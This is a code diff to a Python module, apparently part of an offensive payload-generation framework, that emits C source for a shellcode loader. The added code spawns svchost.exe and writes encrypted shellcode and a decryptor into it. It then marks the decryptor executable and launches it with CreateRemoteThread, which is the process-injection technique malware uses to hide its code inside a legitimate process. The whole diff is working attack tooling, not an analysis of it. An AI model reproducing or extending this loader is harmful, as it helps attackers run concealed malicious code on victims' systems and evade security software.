@@ -1,5 +1,6 @@
 from string import Template
 from c.utils.formatters import bytes_to_c
+from c.utils.functions import *
 
 class carokann:
     def __init__(self, arguments):
@@ -22,28 +23,21 @@ class carokann:
         return []
     
     def codeblocks(self) -> str:
-        return ''
+        return f"""
+{bytes_to_c(self.decryptor, 'decryptor')}
+"""
 
     def template(self) -> str:
-        return Template("""
-    {transformers}
-        
-    $decryptorBytes
-   
-    HANDLE hProcess = (HANDLE)-1;
-    SIZE_T shellcodeSize = {shellcodeSize};
-    PVOID pRemoteShellcode = {VirtualAllocEx}( hProcess, NULL, shellcodeSize + sizeof(SIZE_T), MEM_COMMIT, PAGE_READWRITE );
-    
-    {WriteProcessMemory}( hProcess, pRemoteShellcode, &shellcodeSize, sizeof(SIZE_T), NULL );
-    {WriteProcessMemory}( hProcess, pRemoteShellcode + sizeof(SIZE_T), shellcode, shellcodeSize, NULL );
-    
-    PVOID pRemoteDecryptor = {VirtualAllocEx}( hProcess, NULL, $decryptorLength, MEM_COMMIT, PAGE_READWRITE );
-    
-    {WriteProcessMemory}( hProcess, pRemoteDecryptor, decryptor, $decryptorLength, NULL );
+        template = '{transformers}'
+        template += 'SIZE_T shellcodeSize = {shellcodeSize};'
+        template += CreateProcessA('C:\\\\windows\\\\system32\\\\svchost.exe')
+        template += VirtualAllocEx('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
+        template += WriteProcessMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
+        template += WriteProcessMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
+        template += VirtualAllocEx('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
+        template += WriteProcessMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
+        template += VirtualProtectEx('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
+        template += CreateRemoteThread('newThread', 'hProcess', 'pDecryptor', 'buffer')
+        template += WaitForSingleObject('newThread', 'INFINITE')
 
-    DWORD OldProtect = 0;    
-    {VirtualProtectEx}( hProcess, pRemoteDecryptor, $decryptorLength, PAGE_EXECUTE_READ, &OldProtect );
-    HANDLE hThread         = {CreateRemoteThread}( hProcess, NULL, 0, pRemoteDecryptor, pRemoteShellcode, 0, NULL );
-    
-    {WaitForSingleObject}( hThread, INFINITE );
-""").substitute(target=self.target, memoryPermission=self.memoryPermission, decryptorBytes=bytes_to_c(self.decryptor, 'decryptor').replace('{', '{{').replace('}', '}}'), decryptorLength=self.decryptorLength)
+        return template
